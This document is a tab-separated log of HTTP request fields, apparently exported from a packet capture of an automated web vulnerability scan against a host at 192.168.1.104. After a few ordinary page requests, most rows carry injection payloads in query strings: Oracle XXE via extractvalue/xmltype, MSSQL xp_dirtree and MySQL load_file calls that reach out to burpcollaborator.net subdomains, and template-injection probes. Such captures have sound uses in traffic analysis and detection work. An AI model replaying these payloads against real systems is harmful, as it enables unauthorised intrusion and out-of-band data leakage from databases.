http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			om5iamg1yo				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
											no-cache, no-transform						close										192.168.1.104														http://bet3mnb00id5hxjysan0t8pujlphd710wombcz1.burpcollaborator.net/	1	http://192.168.1.104/		GET				HTTP/1.1																					8bk0jk8xxfa2eugvp7kxq5mrgimea4yxqlg86wv.burpcollaborator.net		/
image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/images/apache_pb.gif		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/images/apache_pb.gif
*/*	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														http://192.168.1.104/noindex/css/open-sans.css	1	http://192.168.1.104/noindex/css/fonts/Light/OpenSans-Light.woff		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/noindex/css/fonts/Light/OpenSans-Light.woff
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104p5vhd12erw4j8bacjoeekmg8azgv4lsej29pzdo.burpcollaborator.net:443		CONNECT				HTTP/1.1																							p5vhd12erw4j8bacjoeekmg8azgv4lsej29pzdo.burpcollaborator.net:443
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20pbill%20SYSTEM%20%22http%3a%2f%2fnlcftzic7ukho9qazmuc0kw6qxwtkj8mwgj67v.burpcollab'%7c%7c'orator.net%2f%22%3e%25pbill%3b]%3e')%2c'%2fl')%20from%20dual)=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20pbill%20SYSTEM%20%22http%3a%2f%2fnlcftzic7ukho9qazmuc0kw6qxwtkj8mwgj67v.burpcollab'%7c%7c'orator.net%2f%22%3e%25pbill%3b]%3e')%2c'%2fl')%20from%20dual)=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?syyfns6eh1=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?syyfns6eh1=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?syyfns6eh1=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?syyfns6eh1=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?v4cre$%7b288*393%7dkul5l=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?v4cre$%7b288*393%7dkul5l=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?v4cre$%7b288*393%7dkul5l=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?v4cre$%7b288*393%7dkul5l=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?b2bui%7b%7b221*967%7d%7dy3xbu=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?b2bui%7b%7b221*967%7d%7dy3xbu=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?b2bui%7b%7b221*967%7d%7dy3xbu=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?b2bui%7b%7b221*967%7d%7dy3xbu=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?ksohc%23%7b525*267%7dgflz9=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?ksohc%23%7b525*267%7dgflz9=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2f0nosvckp97muqmsn1zwp2xyjsay6mwazytlj98.burpcollab'%7c%7c'orator.net%2f%22%3e%25dkjip%3b]%3e')%2c'%2fl')%20from%20dual)=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2f0nosvckp97muqmsn1zwp2xyjsay6mwazytlj98.burpcollab'%7c%7c'orator.net%2f%22%3e%25dkjip%3b]%3e')%2c'%2fl')%20from%20dual)=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?(select%20extractvalue(xmltype(%27%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2f0nosvckp97muqmsn1zwp2xyjsay6mwazytlj98.burpcollab%27%7c%7c%27orator.net%2f%22%3e%25dkjip%3b]%3e%27)%2c%27%2fl%27)%20from%20dual)=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?(select%20extractvalue(xmltype(%27%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2f0nosvckp97muqmsn1zwp2xyjsay6mwazytlj98.burpcollab%27%7c%7c%27orator.net%2f%22%3e%25dkjip%3b]%3e%27)%2c%27%2fl%27)%20from%20dual)=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2fl0md8xxamszf3758ek9afib45vbrzhnlbfy5mu.burpcollab'%7c%7c'orator.net%2f%22%3e%25dkjip%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2fl0md8xxamszf3758ek9afib45vbrzhnlbfy5mu.burpcollab'%7c%7c'orator.net%2f%22%3e%25dkjip%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?1%27%7c%7c(select%20extractvalue(xmltype(%27%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2fl0md8xxamszf3758ek9afib45vbrzhnlbfy5mu.burpcollab%27%7c%7c%27orator.net%2f%22%3e%25dkjip%3b]%3e%27)%2c%27%2fl%27)%20from%20dual)%7c%7c%27=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?1%27%7c%7c(select%20extractvalue(xmltype(%27%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dkjip%20SYSTEM%20%22http%3a%2f%2fl0md8xxamszf3758ek9afib45vbrzhnlbfy5mu.burpcollab%27%7c%7c%27orator.net%2f%22%3e%25dkjip%3b]%3e%27)%2c%27%2fl%27)%20from%20dual)%7c%7c%27=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c3bfvjf8sxaaxepgqp2ksq0mmgdm9azyqoei18px.burpcollab'%2b'orator.net%5clnk'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c3bfvjf8sxaaxepgqp2ksq0mmgdm9azyqoei18px.burpcollab'%2b'orator.net%5clnk'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5c3bfvjf8sxaaxepgqp2ksq0mmgdm9azyqoei18px.burpcollab%27%2b%27orator.net%5clnk%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5c3bfvjf8sxaaxepgqp2ksq0mmgdm9azyqoei18px.burpcollab%27%2b%27orator.net%5clnk%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvutn27rkg2tpxhzi8u3k9s5ez551trhi862tshh.burpcollab'%2b'orator.net%5csap'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvutn27rkg2tpxhzi8u3k9s5ez551trhi862tshh.burpcollab'%2b'orator.net%5csap'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?1%27%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5cvutn27rkg2tpxhzi8u3k9s5ez551trhi862tshh.burpcollab%27%2b%27orator.net%5csap%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?1%27%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5cvutn27rkg2tpxhzi8u3k9s5ez551trhi862tshh.burpcollab%27%2b%27orator.net%5csap%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6ryyziovddq0uswt550v632pwg2cq2et6h04qsf.burpcollab'%2b'orator.net%5cngp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6ryyziovddq0uswt550v632pwg2cq2et6h04qsf.burpcollab'%2b'orator.net%5cngp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5c6ryyziovddq0uswt550v632pwg2cq2et6h04qsf.burpcollab%27%2b%27orator.net%5cngp%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5c6ryyziovddq0uswt550v632pwg2cq2et6h04qsf.burpcollab%27%2b%27orator.net%5cngp%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cho99wtl6aonbr3t42gx63ez0trznndb44syfo3d.burpcollab'%2b'orator.net%5cdnj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cho99wtl6aonbr3t42gx63ez0trznndb44syfo3d.burpcollab'%2b'orator.net%5cdnj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?1%27)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5cho99wtl6aonbr3t42gx63ez0trznndb44syfo3d.burpcollab%27%2b%27orator.net%5cdnj%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?1%27)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d%27%5c%5cho99wtl6aonbr3t42gx63ez0trznndb44syfo3d.burpcollab%27%2b%27orator.net%5cdnj%27%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?(select%20load_file('%5c%5c%5c%5cdr85zpo2dkq7uzw05c026a2wwn2jq9e0goab0zp.burpcollaborator.net%5c%5ctyr'))=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?(select%20load_file('%5c%5c%5c%5cdr85zpo2dkq7uzw05c026a2wwn2jq9e0goab0zp.burpcollaborator.net%5c%5ctyr'))=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/?(select%20load_file(%27%5c%5c%5c%5cdr85zpo2dkq7uzw05c026a2wwn2jq9e0goab0zp.burpcollaborator.net%5c%5ctyr%27))=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/?(select%20load_file(%27%5c%5c%5c%5cdr85zpo2dkq7uzw05c026a2wwn2jq9e0goab0zp.burpcollaborator.net%5c%5ctyr%27))=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web?1'%2b(select%20load_file('%5c%5c%5c%5cm3qeby0bpt2g6889hlcbije58wes2iq9txnkd82.burpcollaborator.net%5c%5cldx'))%2b'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web?1'%2b(select%20load_file('%5c%5c%5c%5cm3qeby0bpt2g6889hlcbije58wes2iq9txnkd82.burpcollaborator.net%5c%5cldx'))%2b'=1
